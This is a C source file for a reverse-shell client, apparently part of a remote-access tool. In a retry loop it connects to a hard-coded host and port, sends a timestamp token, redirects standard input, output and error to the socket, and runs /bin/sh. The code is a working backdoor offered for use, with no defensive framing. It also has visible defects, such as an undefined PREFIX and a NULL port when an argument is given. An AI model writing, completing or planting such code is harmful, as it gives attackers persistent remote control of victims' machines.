#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <sys/time.h>
#include <string.h>

#define HOST "localhost"
#define PORT "44344"

void client_loop(char *p)
{
    int sock;
    char *s = NULL;
    if (!p) s = PORT;
start:
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) return;

    struct addrinfo hints = {0};
    struct addrinfo *res0;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(HOST, s, &hints, &res0) != 0) goto retry;

    if (connect(sock, res0[0].ai_addr, res0[0].ai_addrlen) != 0) goto retry;

    if (s)
    {
        struct timeval tv;
        gettimeofday(&tv, NULL);
        uint64_t token = 1000000 * tv.tv_sec + tv.tv_usec;
        char str[32];
        snprintf(str, sizeof(str), "%" PRIu64 "\n", token);
        printf("%sEND\n", str);
        write(sock, str, strlen(str));
    }

    pid_t pid;
    if (!(pid = fork()))
    {
        dup2(sock, 0);
        dup2(sock, 1);
        if (s) dup2(sock, 2);

        execve("/bin/sh", (char *[]){PREFIX, NULL}, NULL);
    }
    int status;
    waitpid(pid, &status, 0); // i think this sometimes shits out when the connection dies but shell still running

retry:
    close(sock);
    sleep(10);
    goto start; // we dont want to restart if its a revshell
}
